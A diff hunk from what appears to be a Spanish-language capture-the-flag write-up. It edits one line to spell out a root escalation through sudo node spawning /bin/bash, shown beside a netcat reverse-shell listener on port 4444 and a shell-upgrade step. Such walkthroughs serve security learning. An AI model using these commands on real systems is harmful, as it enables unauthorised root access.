@@ -160,7 +160,7 @@ dev@tnightmarebc:~$ ^Z
 zsh: suspended  nc -lvnp 4444
 ```
 
-Volvemos a mejorar la terminal usando un "stty raw mode fix" (stty raw -echo;fg) y un "terminal emulation setup" (export TERM=xterm), para posteriormente ejecutar el comando, lo que nos da acceso completo a root y por ende a todo el sistema.
+Volvemos a mejorar la terminal usando un "stty raw mode fix" (stty raw -echo;fg) y un "terminal emulation setup" (export TERM=xterm), para posteriormente ejecutar el comando `sudo node -e 'require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})'`, lo que nos da acceso completo a root y por ende a todo el sistema.
 ```bash                                                                                                    
 ┌──(kali㉿kali)-[~]
 └─$ stty raw -echo;fg       
